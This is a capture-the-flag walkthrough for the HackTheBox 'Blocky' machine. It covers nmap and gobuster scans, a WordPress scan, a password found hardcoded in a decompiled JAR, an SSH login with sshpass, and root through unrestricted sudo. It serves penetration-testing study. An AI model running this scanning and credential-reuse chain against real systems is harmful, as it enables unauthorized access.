## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)

## 🛰️ Recon

### 🔍 Full TCP Port Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.37
```
> Identifies ports 21 [FTP](FTP), 22 [SSH](SSH), 80 [HTTP](HTTP), and 25565 (Minecraft, closed).

### 🔍 Targeted Service Enumeration
```bash
nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.37
```
> Finds FTP (ProFTPD 1.3.5a), SSH (OpenSSH 7.2p2), HTTP (Apache with WordPress 4.8).

---

## 🌐 Web & WordPress Enumeration

### 🧪 Directory Brute Force
```bash
gobuster dir -u http://10.10.10.37 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php -t 40 -o scans/gobuster-root-medium
```
> Discovers important directories: `/wp-login.php`, `/plugins/`, `/phpmyadmin`, `/wiki`.

### 🔍 WordPress Scan
```bash
wpscan --url http://10.10.10.37 -e ap,t,tt,u | tee scans/wpscan
```
> Finds:
- WP version: 4.8
- User: `notch`
- `/wp-content/uploads/` listing enabled
- `/xmlrpc.php` accessible

---

## 📦 Plugin Enumeration & JAR Analysis

### 🔽 Download Java JAR Files from `/plugins/`
> Found by visiting `/plugins` in browser.

### 🧪 Decompile with jd-gui (GUI tool)
```bash
# No command—GUI-based tool
```
> `BlockyCore.jar` contains hardcoded MySQL password:  
`8YsqfCTnvxAUeduzjNSXe22`

---

## 🔓 Shell as notch

### 🧪 Attempt SSH Login with Found Credentials
```bash
sshpass -p 8YsqfCTnvxAUeduzjNSXe22 ssh notch@10.10.10.37
```

### 📄 Capture User Flag
```bash
cat ~/user.txt
```

---

## 🪜 Privilege Escalation to root

### 🔍 Check sudo Rights
```bash
sudo -l
```
> notch can run **ALL commands as root**.

### 🔁 Elevate to Root
```bash
sudo su -
```

### 🏁 Capture Root Flag
```bash
cat /root/root.txt
```